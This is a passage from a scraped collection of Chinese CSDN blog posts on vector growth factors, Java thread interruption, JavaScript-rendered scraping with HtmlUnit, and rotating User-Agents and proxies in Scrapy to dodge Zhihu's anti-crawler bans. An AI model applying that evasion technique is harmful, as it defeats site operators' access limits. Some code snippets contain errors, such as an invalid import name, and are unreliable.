销毁原内存块中的元素 \n4. 将原内存块释放，归还给操作系统\n\n如果有 n 个元素，那么上述操作的时间复杂度为 O(n)，每次增加一个元素都需要执行一次。2 和 3 步骤将耗费主要的时间。因此，这种方法，当我们为 vector 在申请 n 大小的时候需要耗费 O(n) 的时间。\n\n现在采用一种折中的方法。当我们再分配的时候，我们额外申请很多空间，这样，在下一次添加元素的时候，就不需要频繁的进行再分配，这样能节约很多时间。但是这种方式的代价就是需要浪费一些空间。另一方面，我们可以只申请一点额外的空间，这样做可以节约空间，只需要花时间在额外的再分配上。换句话说，我们是通过空间换取了时间。\n\n\n\n再分配策略 (Reallocation Strategy)\n\n举一个极端点的例子，假设我们需要往一个 vector 对象中添加元素，我们每一次都需要扩大 vector 的容量，即申请多一个的空间存储新增的元素。虽然这么做，能很好的节省空间，需要多大就申请多大，但是如果需要添加 n 个元素，那么我们需要重新申请 n 次空间，并且每次都需要将原来的元素拷贝到新申请的内存块中，时间为 O(n)。也就是说，如果我们需要在一个空的 vector 中添加 k 个元素，总的时间为\n\nO(1 + 2 + 3 + ... + k) = O(k(1+k)/2)\n\n\n即时间复杂度为 O(k2)，这种策略效率是很差的。(That’s terrible!)\n\n现在，我们换一种策略，假设我们每次扩大 vector 的容量的时候，不是每次只增加一，而是增加一个恒定的大小 C。通过这个增长因子 C，能明显较少重申请的次数，这当然是一个进步，但是效率能有多大提升呢？\n\n上面这中策略在我们每次添加 C 个元素的时候，都需要扩大 vector 的容量，冲申请一次。假设我们需要添加 K*C 个元素，那么第一次重申请需要拷贝 C 个元素，第二次需要拷贝 2C 个元素……，消耗的总时间仍然是二次方。\n\n二次方的时间复杂度的策略，还有很大的可优化的空间，即使使用高性能的处理器和大内存也不能解决问题。\n\n上述策略分析得知，为 vector 再分配内存，扩大容量时，每次申请仅仅是扩大一个固定的大小，时间复杂度达到二次方。相反，额外申请的容量必须随着 vector 容量的增长而增长。那么，如果我们每次为 vector 重新申请内存时，额外申请的空间是之前的 2 倍大小的话，可以显著的降低时间复杂度，为 O(n)。\n\n当我们为 vector 重新申请内存并向 vector 添加元素时，我们将 vector 想成一下这种结构： \n\n\n最后一次重新分配内存之后，有一半的空间可以添加新元素，所以这部分元素不需要拷贝，但是原先的那 n/2 个元素需要进行拷贝到新申请的内存中；同理，上一次重分配时，有 n/4 的元素需要拷贝，以此一次类推，获得如下公式 \n\ntotal = (n/2)*1 + (n/2^2)*2 + (n/2^3)*3 + ... + (n/2^k)*k\n\n\n这就是时间复杂度的计算公式，结果为\n\ntotal = 2n - (n/2^k)(2+k)\n\n\n时间复杂度达到了 O(n)。\n\n\n\n讨论 discussion\n\nC++ 标准并没有强制要求 vector 类必须按照特定的方式管理内存，标准要求的是创建一个 n 个元素的 vector ，重复调用 push_back 添加元素的时间控制在 O(n) 内。我们讨论的重分配的策略恰恰是一种最直观的能够满足这一条件的方式。\n\n既然 vector 的性能这么好，那我们当然可以使用如下的循环进行编码\n\nvector<double> values;\ndouble x;\nwhile (cin >> x) {\n    values.push_back (x)\n}\n\n\n这种再分配的策略申请的额外内存会随着 vector 容量 (capacity) 增长而增长，它比每次只固定增加某一大小的方法性能要高，但是，如果你能预测或者已经知道你需要保存的元素的数量，直接申请一块能够保存所有元素的内存块存储这些元素，岂不更好吗？\n\n\n\n一条华丽的分割线\n\n上面的译文，讲述了 c++ 中 vector 的动态增长因子为 2，以及为 2 的好处，但是并没有说明为什么是 2\n\n\n\n\n\nWhat is the ideal growth rate for a dynamically allocated array\n\n动态数组的增长因素依赖很多元素，包括时间与空间的权衡以及用于内存分配的算法。关于最佳增长因子，展开过很多次讨论，包括推荐使用黄金比例来进行。(The Golden Ratio - Phi, 1.618)。以下是一些比较流行的语言中的增长因子2： \n\n\n在有些讨论中3，认为增长因子 1.5 要优于 2，首先我们分析一下增长因子为 2 的情况：\n\n1、 假如现在申请了一个 16B 的内存空间 \n2、 当我们需要更多内存的时候，我们申请了 32B 的内存空间，释放掉之前的 16B \n3、 当我们在需要更多内存的时候，我们需要申请 64B 的内存空间，释放掉之前的 32B 的空间，此时一共释放了 16B+32B=48B 的空间 \n4、 当我们继续需要更大的空间的时候，我们需要申请 128B 的空间，释放的总空间大小为 112B \n5、 依次类推\n\n根据以上思路，每次内存重申请都是原来内存的两倍大小，根据申请的内存大小和释放的内存大小可知，指数增长总是更快，也就是说释放的总的内存大小总是小于下一次需要申请的内存大小，这样造成的情况就是，每次都不能对之前的内存复用4 (上面的文章中已经说过了，一般申请都是连续的内存)。\n\n如果增长因子为 1.5 的话，分析如下：\n\n1、 假如申请了 16B 的内存空间 \n2、 再次申请内存需要申请 24B 的空间，释放掉之前的 16B 的空间 \n3、 需要更多内存时，需要申请 36B 的空间，释放空间为 40B \n4、 需要更多内存时，需要申请 54B 的空间，释放空间为 76B \n5、 需要更多内存时，需要申请 81B 的空间，释放空间为 130B \n6、 需要更多内存时，需要申请 122B 的空间，此时，可以使用前面释放的 130B 的空间，这样就能充分利用到内存。\n\n有些人认为，如果增长因子是 1.5，那么在计算申请内存的时候，需要先转换成浮点数，然后计算后，在转换成整数，这样大大增加了计算量。\n\n但是，1.5 倍，等于是 old * 3/2，/2 可以使用位运算 >>1 来实现。所以，并不需要非要进行浮点运算转换。\n\n那么，下面我们思考一下，如果我们增长因子为 x，最开始申请的内存空间大小为 T。下一次需要申请的内存为 T*x，释放空间为 T；当需要更多内存时，再次申请内存为 T*x^2，释放空间为 T + T*x；……\n\n我们的目标就是后面申请新内存时，能够重用到之前释放的那些内存(假设他们是相邻的)，也就是说新申请的内存不超过之前释放的内存之和，得到如下等式：\n\nT*x^n <= T + T*x + T*x^2 + ... + T*x^(n-2)\n\n\n等式两边消除 T 所得：\n\nx^n <= 1 + x + x^2 + ... + x^(n-2)\n\n\n通常，我们说第 n 次申请内存，期望是第 n 次申请内存，能够使用到之前释放的内存，也就是释放的内存总和不小于第 n 次申请的内存大小。\n\n比如，根据上面的等式，当我们想要在第三步就能达到这种预期，即 n = 3\n\nx^3 <= 1 + x\n\n\n等式的解为 0 < x < 2，精确一点就是 0 < x < 1.3，当 n 为其他值时如下\n\nn  maximum-x (roughly)\n\n3  1.3\n\n4  1.4\n\n5  1.53\n\n6  1.57\n\n7  1.59\n\n22 1.61\n\n\n增长因子都比 2 小。\n\n参考文献：\n\nhttp://www.drdobbs.com/c-made-easier-how-vectors-grow/184401375 ↩https://en.wikipedia.org/wiki/Dynamic_array ↩https://stackoverflow.com/questions/1100311/what-is-the-ideal-growth-rate-for-a-dynamically-allocated-array# ↩https://github.com/facebook/folly/blob/master/folly/docs/FBVector.md ↩", "time": "2018_08_14_11_12_32", "link": "https://blog.csdn.net/honglicu123/article/details/77541943", "title": "动态数组的内存增长因子如何选择-1.5倍还是2倍？"}
{"timestamp": "2018_08_14_11_12_33", "desc": "如何获取不断变化的 User-Agent\n\n\n  推荐我的个人博客: blog.wuzhenyu.com.cn\n  \n  User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。\n\n\n比如，firefox 浏览器中的 user agent 可能为 Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0，其他浏览器的 user agent 都是不一样的。那么如何随机更换 user agent 呢。\n\n如果我们能获取到所有可能出现的 user agent，那么我们只需要随机从这些 user agent 列表中取一条就可以了。正好，有人已经帮我们实现了这个事情。在 github 上搜索 useragent，选择 fake-useragent，作者维护了一个可变的user agent 列表，地址为 https://fake-useragent.herokuapp.com/browsers/0.1.7，这个地址是可以根据版本变化的，以前版本的链接可能已经无法访问。这里列出了所有作者维护的 user-agent(感谢作者和开源的贡献，给我们提供的方便)。那么，我们通过获取到这些 user-agent，然后随机的从这个列表中取 user-agent 就可以。\n\n这当然是一种方法，但既然已经有了 fake-useragent，那么我们就不需要这么做了。大家也可以看帮助文档中的使用方法。\n\n# 安装 fake-useragent\npip install fake-useragent\n\n\n使用 fake-useragent\n\nfrom fake-useragent import UserAgent\nua = UserAgent()\nua.ie   # 输出 ie 中的一个随机的 useragent\nua.firefox # 输出 firefox 中的一个随机的 useragent\n# 可以查看帮助文档\n\n\n在 scrapy 中获取变化的 useragent\n\n在 scrapy 爬虫的时候，比如爬取知乎的文章，知乎有一定的反爬虫限制，会检测你的 useragent，如果访问量很大，就会暂时停止你访问服务器，那么我们就需要不断获取变化的 useragent 来避免被知乎禁止访问服务器。\n\n大家在 scrapy 官方帮助文档的时候，应该可以看到 scrapy 的系统设计图 \n\n\n当我们通过 spider yield 一个 requests 的时候，首先通过 spider middlewares 到达 scrapy engine，然后 engine 将 requests 放到 scheduler 的队列中，通过 scheduler 调度队列中的 requests ，scheduler 选中一个 requests 后，将 requests 通过 engine 传递给 downloader，在这之前，必然会经过 downloader middlewares，downloader 下载好之后，将 response 返回给 engine，engine 在将 response 返回给 spider，我们就可以在 spider 中调用 callback 进行解析，简单的流程大概就是这样。\n\n那么，我们在将 requests 提交给 downloader 进行下载之前，就需要将 user-agent 进行变化，也就是每次都需要随机取一个 user-agent 才能提交到 downloader 进行下载，否则就可能被知乎禁掉。在提交到 downloader 的时候，必然会经过 downloader middlewares，所以我们实现随机获取 user-agent 的逻辑部分，可以在 downloader midllewares 这里实现。\n\nclass RandomUserAgentMiddleWare(object):\n    \"\"\"\n    随机更换User-Agent\n    \"\"\"\n    def __init__(self,crawler):\n        super(RandomUserAgentMiddleWare, self).__init__()\n        self.ua = UserAgent()\n        self.ua_type = crawler.settings.get(\"RANDOM_UA_TYPE\", \"random\")\n\n    @classmethod\n    def from_crawler(cls, crawler):\n        return cls(crawler)\n\n    def process_request(self, request, spider):\n        def get_ua_type():\n            return getattr(self.ua, self.ua_type)   # 取对象 ua 的 ua_type 的这个属性, 相当于 self.ua.self.ua_type\n\n        # random_useragent = get_ua_type()\n        request.headers.setdefault('User-Agent', get_ua_type())\n\n\n完成 downloader middleware 的时候，我们需要像在 pipelines 一样，在 settings.py 中进行设置，让我们的 middleware 生效。在 settings.py 这个文件中，有一个 DOWNLOADER_MIDDLEWARES 这个字典对象，一般默认是注释的，打开注释，并将默认的 middleware 注释掉，按照规则加上我们自己的 middleware。字典后面键对应的值，越大表示被调用的优先级越低，调用的顺序越靠后，如果不希望注释掉默认的或者其他的 middleware，就要将我们自己实现的这个 middleware 的值设置的最大，这样，就能保证我们自己实现的 middleware 是在最后一个被调用，user-agent 不会被其他的影响。\n\n当然，上面的代码中，设置了一个 RANDOM_UA_TYPE，这样，就能通过设置这个值，来获取不同浏览器的 user-agent\n\nRANDOM_UA_TYPE = \"safari\"\n\n\n\n\n在 scrapy 中设置代理\n\n在 scrapy 中设置代理是非常简单的，比如上面的代码中，在 process_request 函数的最后加上一句\n\nrequest.meta[\"proxy\"] = \"ip:port\"\n\n\n上面就设置了 scrapy 的代理了，非常简单。但是，如何获取这些代理的 ip 和 port 是一个问题。\n\n我们发现，西刺网为我们提供了很多可用的代理服务器ip和端口，我们只需要将这个网站上面的所有的需要的代理数据获取下来，放在文件或者数据库中，每次随机取一个使用，能够实现通过随机代理的方式爬取网站数据。如何爬取所有的代理数据，大家可以参考我之前的一篇博文[ scrapy简单入门 - 爬取伯乐在线所有文章 ]。", "time": "2018_08_14_11_12_33", "link": "https://blog.csdn.net/honglicu123/article/details/76652462", "title": "获取随机User-Agent和随机ip代理"}
{"timestamp": "2018_08_14_11_12_33", "desc": "不知道大家在使用 jsoup 的过程中有没有遇到爬取内容时，发现有的网页里面的内容时通过 JavaScript 异步加载的数据，导致我们的爬虫空手而归（只抓到一个网页的外框）。\n\n首先再遇到这个问题的时候想到的解决方案有两种：\n\n\n使用类似 Python 中延迟加载的方式使等待网页异步加载完成后爬取异步加载完成的网页\n使用某种特殊的方法使爬取出来的网页外框模拟执行里面的 JavaScript 代码，最终到达获取完整的网页\n\n\n在搜索引擎的帮助之下，确定了使用方案2 来解决该问题，方案1 没有搜索到较好的第三方库，有在 java 中使用方案1来解决这个问题的朋友希望可以与在下探讨一番，不胜感激。\n\n案例很简单，抓一个今日头条的首页内容。大家可以去看一下今日头条的首页，里面的内容时异步加载的。 \nhttps://www.toutiao.com/\n\n加入 jsoup 和 htmlunit 的依赖\n\n\n\n<dependency>\n    <groupId>org.jsoup</groupId>\n    <artifactId>jsoup</artifactId>\n    <version>1.10.2</version>\n</dependency>\n<dependency>\n    <groupId>net.sourceforge.htmlunit</groupId>\n    <artifactId>htmlunit</artifactId>\n    <version>2.25</version>\n</dependency>\n\n首先我们单独使用 jsoup 来解析今日头条的首页\n\n\n\nString url = \"https://www.toutiao.com/\";\nConnection connect = Jsoup.connect(url);\nDocument document = connect.get();\nSystem.out.println(document);\n\n↑ 这里我们只能获取到网页的框架内容，获取不到首页上面的新闻内容\n\n下面，我们使用 htmlunit 来试试\n\n\n\n//构造一个webClient 模拟Chrome 浏览器\nWebClient webClient = new WebClient(BrowserVersion.CHROME);\n//屏蔽日志信息\nLogFactory.getFactory().setAttribute(\"org.apache.commons.logging.Log\",\n        \"org.apache.commons.logging.impl.NoOpLog\");\njava.util.logging.Logger.getLogger(\"com.gargoylesoftware\").setLevel(Level.OFF);\n//支持JavaScript\nwebClient.getOptions().setJavaScriptEnabled(true);\nwebClient.getOptions().setCssEnabled(false);\nwebClient.getOptions().setActiveXNative(false);\nwebClient.getOptions().setCssEnabled(false);\nwebClient.getOptions().setThrowExceptionOnScriptError(false);\nwebClient.getOptions().setThrowExceptionOnFailingStatusCode(false);\nwebClient.getOptions().setTimeout(5000);\nHtmlPage rootPage = webClient.getPage(url);\n//设置一个运行JavaScript的时间\nwebClient.waitForBackgroundJavaScript(5000);\nString html = rootPage.asXml();\nDocument document = Jsoup.parse(html);\n\n这样我们就可以得到一个包含运行 JavaScript 之后的完整源网页了", "time": "2018_08_14_11_12_33", "link": "https://blog.csdn.net/xiaoping0915/article/details/72822611", "title": "【Jsoup】配合 htmlunit 爬取异步加载的网页"}
{"timestamp": "2018_08_14_11_12_34", "desc": "调用Thread.interrupt()方法并不能真正停止线程，只是在当前线程做了一个中断的状态标志。\n\n\n\npublic class MyThread extends Thread{\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 100; i++) {\n            super.run();\n            System.out.println(\"i=\"+(i+1));\n        }\n    }\n\n}\n\n\n\npublic class Runner {\n    public static void main(String[] args) {\n\n            MyThread myThread = new MyThread();\n            myThread.start();\n            myThread.interrupt();\n            System.out.println(\"第一次调用myThread.isInterrupted(),返回值：\"+myThread.isInterrupted());\n            System.out.println(\"第二次调用myThread.isInterrupted(),返回值：\"+myThread.isInterrupted());\n            System.out.println(\"===========end=============\");\n    }\n\n}\n\n上面我们创建了一个MyThread线程，然后Runner类中，执行main方法，创建MyThread的实例，启动线程，然后调用myThread.interrupt(); \n打印出信息：\n\n\n  i=1 \n  第一次调用myThread.isInterrupted(),返回值：true \n  i=2 \n  第二次调用myThread.isInterrupted(),返回值：true \n  i=3 \n  ==========end============== \n  i=4 \n  i=5 \n  i=6 \n  i=7 \n  i=8 \n  i=9 \n  i=10 \n  i=11 \n  i=12 \n  i=13 \n  i=14\n\n\n从打印信息可以看出，虽然调用了myThread.interrupt()方法，但是MyThread并没有立即中断执行。这里我们两次调用myThread.isInterrupted()，返回值都是true。 \n我们对Runner方法坐下修改，改成两次调用myThread.interrupted()。 \n代码如下：\n\npublic class Runner {\n    public static void main(String[] args) {\n\n            MyThread myThread = new MyThread();\n            myThread.start();\n            myThread.interrupt();\n            System.out.println(\"第一次调用myThread.interrupted(),返回值：\"+myThread.interrupted());\n            System.out.println(\"第二次调用myThread.interrupted(),返回值：\"+myThread.interrupted());\n            System.out.println(\"============end===================\");\n    }\n\n}\n\n打印信息如下：\n\n\n  第一次调用myThread.interrupted(),返回值：false \n  i=1 \n  第二次调用myThread.interrupted(),返回值：false \n  i=2 \n  ===========end================= \n  i=3 \n  i=4 \n  i=5 \n  i=6\n\n\n虽然线程依然没有被中断，但是调用myThread.interrupted()是，返回都是false。难度是MyThread并没有中断状态吗？\n\n再看一下代码：\n\n\n\npublic class Runner {\n    public static void main(String[] args) {\n\n            Thread.currentThread().interrupt();\n            System.out.println(\"第一次调用Thread.interrupted(),返回值：\"+Thread.interrupted());\n            System.out.println(\"第二次调用Thread.interrupted(),返回值：\"+Thread.interrupted());\n            System.out.println(\"=================end===============================\");\n    }\n\n}\n\n打印信息如下：\n\n\n  第一次调用Thread.interrupted(),返回值：true \n  第二次调用Thread.interrupted(),返回值：false \n  ========end=======\n\n\n以上代码是对当前线程，即main方法执行的线程，调用interrunt方法。第一次调用Thread.interrupted()返回值是true，说明当前线程已经被标记了中断状态，那么为什么第二次调用Thread.interrupted()返回值却是false呢？\n\n这里需要引出官方文档对Thread.interrupted()的定义：\n\n\n  测试当前线程是否已经中断，线程的中断状态也是由该方法清除。\n\n\n也就是说，如果连续两次调用该方法，那么第一次调用时，如果当前线程已经处于中断状态，那么该方法会返回true，同时清除当前线程被标记的中断状态。第二次调用时，（第二次调用之前，没有再次调用Thread.currentThread().interrupt();）就会返回false了。\n\n总结\n\n\n  \n  调用线程的interrupt方法，并不能真正中断线程，只是给线程做了中断状态的标志 \n  Thread.interrupted()：测试当前线程是否处于中断状态。执行后将中断状态标志为false\n  Thread.isInterrupte()： 测试线程Thread对象是否已经处于中断状态。但不具有清除功能", "time": "2018_08_14_11_12_34", "link": "https://blog.csdn.net/fjse51/article/details/53928272", "title": "Thread.interrupted()与Thread.isInterrupted()的区别"}
{"timestamp": "2018_08_14_11_12_34", "desc": "使用interrupt（）中断线程\n\n当一个线程运行时，另一个线程可以调用对应的Thread对象的interrupt（）方法来中断它，该方法只是在目标线程中设置一个标志，表示它已经被中断，并立即返回。\n\n这里需要注意的是，如果只是单纯的调用interrupt（）方法，线程并没有实际被中断，会继续往下执行。\n\n下面一段代码演示了休眠线程的中断:\n\n\n\npackage com.wrh.threadInterrupt;\n\npublic class ThreadInterrupt implements Runnable{\n\n    public static void main(String[] args) {\n        //开启一个线程\n        ThreadInterrupt runnable=new ThreadInterrupt();\n        Thread t=new Thread(runnable);\n        t.start();\n\n        try {\n            Thread.sleep(5000);//使main线程休息会，让子线程有时间运行会。\n        } catch (InterruptedException e) {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        }\n        //中断子线程\n        System.out.println(\"main ----即将中断子线程\");\n        t.interrupt();\n        System.out.println(\"main-----main线程运行结束结束\");\n    }\n\n    @Override\n    public void run() {\n        System.out.println(\"run----子线程正在运行\");\n        try {\n            Thread.sleep(20000);//子线程休息20秒，等待main线程来终端\n        } catch (InterruptedException e) {\n            // TODO Auto-generated catch block\n            System.out.println(\"run-----子线程在休息的时候被中断\");\n            return;//如果没有return，则即使线程中断也不会立即返回，他还会继续运行下面的代码\n        }\n\n        System.out.println(\"run-------子线程运行结束\");\n\n    }\n\n}\n\n\n上面的逻辑很清楚，这里就不在解释。 \n运行结果如下\n\n\n  run—-子线程正在运行 \n  main —-即将中断子线程 \n  main—–main线程运行结束结束 \n  run—–子线程在休息的时候被中断\n\n\n这里要说明的是：由于不确定的线程规划，程序中后面两条语句的输出顺序可能相反。\n\n\n\n待决中断\n\n在上面的例子中，线程在执行sleep（）方法休眠时被其它线程中断，它会相当友好地终止线程，并抛出InterruptedException异常。另外一种情况，如果线程在调用sleep（）方法前被中断，那么该中断称为待决中断，它会在刚调用sleep（）方法时，立即抛出InterruptedException异常。\n\n\n\npackage com.wrh.threadInterrupt;\n\npublic class PendingInterrupt {\n    private static boolean flag;\n    public static void main(String[] args) {\n        flag=true;\n        if(flag){\n            Thread.currentThread().interrupt();//中断当前线程\n        }\n        long curTime=System.currentTimeMillis();\n        try {//当前线程休眠20秒\n            System.out.println(\"当前线程即将sleep的前一条语句\");\n            Thread.sleep(20000);\n            System.out.println(\"程序没有被中断\");\n        } catch (InterruptedException e) {\n            // TODO Auto-generated catch block\n            System.out.println(\"程序被中断\");\n        }\n\n        System.out.println(\"程序运行的时间:\"+(System.currentTimeMillis()-curTime));\n\n    }\n\n}\n\n/*\n * 当falg=false时\n * 输出：   当前线程即将sleep的前一条语句\n *      程序没有被中断\n        程序运行的时间:20000\n    当flag=true时\n    输出：当前线程即将sleep的前一条语句\n        程序被中断\n        程序运行的时间:0\n * */\n\n\n有的人可能会有这样的译文：main线程中断了，它怎么还在继续运行呀？ \n原因是：在catch块中没有return，因此，只用interrupt()是无法立即中断线程的，它还会继续往下面运行。\n\n\n\nThread.interrupted()来判断当前线程是否中断\n\n可以使用Thread.interrupted（）方法来检查当前线程的是否中断（并隐式重置为false）。又由于它是静态方法，因此不能在特定的线程上使用，而只能报告调用它的线程的中断状态，如果线程被中断，而且中断状态尚不清楚，那么，这个方法返回true。与isInterrupted（）不同，它将自动重置中断状态为false，第二次调用Thread.interrupted（）方法，总是返回false，除非中断了线程。\n\n\n\npackage com.wrh.threadInterrupt;\n\npublic class ThreadInterrupted {\n\n    public static void main(String[] args) {\n        System.out.println(\"A点：Thread.interruped()的结果为\"+Thread.interrupted());\n        //线程中断\n        Thread.currentThread().interrupt();\n        System.out.println(\"B点：Thread.interruped()的结果为\"+Thread.interrupted());\n\n        System.out.println(\"C点：Thread.interruped()的结果为\"+Thread.interrupted());\n    }\n\n}\n/*\n * 运行结果：\n *  A点：Thread.interruped()的结果为false\n    B点：Thread.interruped()的结果为true\n    C点：Thread.interruped()的结果为false\n * */\n\n\nisInterrupted()来判断线程是否被中断\n\npackage com.wrh.threadInterrupt;\n//isInterrupt()方法的用法\npublic class ThreadIsInterrupt {\n\n    public static void main(String[] args) {\n        System.out.println(\"A点： Thread.currentThread().isInterrupted()=\"+Thread.currentThread().isInterrupted());\n        Thread.currentThread().interrupt();;//线程中断\n        System.out.println(\"B点： Thread.currentThread().isInterrupted()=\"+Thread.currentThread().isInterrupted());\n        System.out.println(\"C点： Thread.currentThread().isInterrupted()=\"+Thread.currentThread().isInterrupted());\n    }\n\n}\n\n\n运行结果\n\n\n  A点： Thread.currentThread().isInterrupted()=false \n  B点： Thread.currentThread().isInterrupted()=true \n  C点： Thread.currentThread().isInterrupted()=true\n\n\n从结果可以看出，当线程被中断后，Thread.currentThread().isInterrupted()的结果就被一直是ture，与interrupted()不一样，不会重置会false；这一点要区分开", "time": "2018_08_14_11_12_34", "link": "https://blog.csdn.net/u010412719/article/details/49406589", "title": "Java中的线程中断：interrupt()、interrupted()和isInterrupted"}
{"timestamp": "2018_08_14_11_12_34", "desc": "前面提到了stop()、suspend()等方法在终止与恢复线程的弊端，那么问题来了，应该如何正确终止与恢复线程呢？这里可以使用两种方法：interrupt()方法和使用boolean变量进行控制。\n\n在使用interrupt方法之前，有必要介绍一下中断以及与interrupt相关的方法。中断可以理解为线程的一个标志位属性，表示一个运行中的线程是否被其他线程进行了中断操作。这里提到了其他线程，所以可以认为中断是线程之间进行通信的一种方式，简单来说就是由其他线程通过执行interrupt方法对该线程打个招呼，让起中断标志位为true，从而实现中断线程执行的目的。\n\n其他线程调用了interrupt方法后，该线程通过检查自身是否被中断进行响应，具体就是该线程需要调用isInterrupted方法进行判断是否被中断或者调用Thread类的静态方法interrupted对当前线程的中断标志位进行复位（变为false）。需要注意的是，如果该线程已经处于终结状态，即使该线程被中断过，那么调用isInterrupted方法返回仍然是false，表示没有被中断。\n\n那么是不是线程调用了interrupt方法对该线程进行中断，该线程就会被中断呢？答案是否定的。因为Java虚拟机对会抛出InterruptedException异常的方法进行了特别处理：Java虚拟机会将该线程的中断标志位清除，然后跑出InterruptedException，这个时候调用isInterrupted方法返回的也是false。\n\n下面的代码首先创建了两个线程，一个线程内部不停睡眠，另一个则不断执行，然后对这两个线程执行中断操作。\n\npackage com.rhwayfun.concurrency;\n\n/**\n * Created by rhwayfun on 16-4-2.\n */\npublic class Interrupted {\n\n    public static void main(String[] args){\n        //创建一个休眠线程\n        Thread sleepThread = new Thread(new SleepThread(),\"SleepThread\");\n        //设为守护线程\n        sleepThread.setDaemon(true);\n        //创建一个忙线程\n        Thread busyThread = new Thread(new BusyThread(),\"BusyThread\");\n        //把该线程设为守护线程\n        //守护线程只有当其他前台线程全部退出之后才会结束\n        busyThread.setDaemon(true);\n        //启动休眠线程\n        sleepThread.start();\n        //启动忙线程\n        busyThread.start();\n        //休眠5秒，让两个线程充分运行\n        SleepUtil.second(5);\n        //尝试中断线程\n        //只需要调用interrupt方法\n        sleepThread.interrupt();\n        busyThread.interrupt();\n        //查看这两个线程是否被中断了\n        System.out.println(\"SleepThread interrupted is \" + sleepThread.isInterrupted());\n        System.out.println(\"BusyThread interrupted is \" + busyThread.isInterrupted());\n        //防止sleepThread和busyThread立刻退出\n        SleepUtil.second(2);\n    }\n\n    /**\n     * 不断休眠\n     */\n    static class SleepThread implements Runnable{\n        public void run() {\n            while (true){\n                try {\n                    TimeUnit.SECONDS.sleep(10);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    /**\n     * 不断等待\n     */\n    static class BusyThread implements Runnable{\n        public void run() {\n            while (true){\n                //忙等待\n            }\n        }\n    }\n}\n\n\n执行结果：\n\n\n\n可以发现内部不停睡眠的方法执行执行中断后，其中断标志位返回的是false，而一直运行的线程的中断标志位则为true。这里主要由于Sleep方法会抛出InterruptedException异常，所以Java虚拟机把SleepThread的中断标志位复位了，所以才会显示false。\n\n那么使用interrupt方法正确终止线程已经很明显了，代码如下：\n\npackage com.rhwayfun.concurrency;\n\nimport java.text.DateFormat;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.concurrent.TimeUnit;\n\n/**\n * Created by rhwayfun on 16-4-2.\n */\npublic class SafeShutdownThread {\n    public static void main(String[] args) throws InterruptedException {\n        DateFormat format = new SimpleDateFormat(\"HH:mm:ss\");\n        Runner one = new Runner();\n        //创建第一个计数线程，该线程使用jdk自带的中断方法执行中断\n        Thread threadOne = new Thread(one,\"ThreadOne\");\n        //执行第一个线程\n        threadOne.start();\n        //threadOne休眠一秒，然后由main thread执行中断\n        TimeUnit.SECONDS.sleep(1);\n        threadOne.interrupt();\n        System.out.println(\"ThreadOne is interrupted ? \" + threadOne.isInterrupted());\n        System.out.println(\"main thread interrupt ThreadOne at \" + format.format(new Date()));\n\n        //创建第二个线程，该线程使用cancel方法执行中断\n        Runner two = new Runner();\n        Thread threadTwo = new Thread(two,\"ThreadTwo\");\n        threadTwo.start();\n        //休眠一秒，然后调用cancel方法中断线程\n        TimeUnit.SECONDS.sleep(1);\n        two.cancel();\n        System.out.println(\"ThreadTwo is interrupted ? \" + threadTwo.isInterrupted());\n        System.out.println(\"main thread interrupt ThreadTwo at \" + format.format(new Date()));\n    }\n\n    /**\n     * 该线程是一个计数线程\n     */\n    private static class Runner implements Runnable{\n        //变量i\n        private long i;\n        //是否继续运行的标志\n        //这里使用volatile关键字可以保证多线程并发访问该变量的时候\n        //其他线程都可以感知到该变量值的变化。这样所有线程都会从共享\n        //内存中取值\n        private volatile boolean on = true;\n        public void run() {\n            while (on && !Thread.currentThread().isInterrupted()){\n                i++;\n            }\n            System.out.println(\"Count i = \" + i);\n        }\n\n        //让线程终止的方法\n        public void cancel(){\n            on = false;\n        }\n    }\n}\n\n\n在计数线程中通过使用一个boolean变量成功终止了线程。这种通过标志位或者中断操作的方式能够使得线程在终止的时候有机会去清理资源，而不是武断地将线程终止，因此这种终止线程的做法更优雅和安全。\n\n上面的程序只是正确地终止了线程，却没有给出正确恢复的方法。可能有人会想到：再写一个方法让on变量为true不就行了。事实并如此，因为在CountThread中，由于已经调用cancel方法，这时on变量已经是false了，线程按照顺序执行原则继续执行，所以即使改变on为true也是没用的，因为CountThread已经终止了。具体的解决方法将在下一篇关于等待通知机制的文章给出详细的解决措施。", "time": "2018_08_14_11_12_34", "link": "https://blog.csdn.net/u011116672/article/details/51044673", "title": "Java并发编程系列之七：正确终止与恢复线程"}
{"timestamp": "2018_08_14_11_12_35", "desc": "利用标志变量\n\n通过检查volatile类型的标志变量控制线程中断,不使用volatile类型的标志变量会导致jvm对内存的优化引起死循环\n\n\n\npublic class StopThread {\n    private static volatile boolean stopRequested;\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread backgroundThread = new Thread(new Runnable() {\n            public void run() {\n                int i = 0;\n                while (!stopRequested) {\n                    i++;\n                }\n            }\n        });\n\n        backgroundThread.start();\n\n        TimeUnit.SECONDS.sleep(1);\n        stopRequested = true;\n    }\n}\n\n\n\ninterrupt中断\n\n如果不通过像上述这样的标志变量中断线程,也可以利用Thread类的相关方法进行中断\n\n\n\n\n  header 1\n  header 2\n\n\n\n  public static boolean interrupted\n  测试当前线程是否已经中断。线程的中断状态 由该方法清除。换句话说，如果连续两次调用该方法，则第二次调用将返回 false（在第一次调用已清除了其中断状态之后，且第二次调用检验完中断状态前，当前线程再次中断的情况除外）。\n\n\n  public boolean isInterrupted()\n  测试线程是否已经中断。线程的中断状态不受该方法的影响。\n\n\n  public void interrupt()\n  中断线程。\n\n\n\n\nThread.interrupt方法可以中断线程正在执行的会抛出InterruptedException的方法时,执行interrupt方法的时候该线程会抛出异常,以异常的方式中断线程,比如下面这个例子\n\n\n\n例一\n\n\n\npublic static void main(String[] args) throws InterruptedException {\n        Thread thread=new Thread(new Runnable() {\n            @Override\n            public void run() {\n                try {\n                    TimeUnit.SECONDS.sleep(60);\n                } catch (InterruptedException e) {\n                    //执行后续清理\n                    System.err.println(\"this thread has been notified...\");\n                }\n\n            }\n        });\n        thread.start();\n        //等待让thread线程开始运行\n        TimeUnit.SECONDS.sleep(1);\n        thread.interrupt();\n        System.out.println(\"finish\");\n    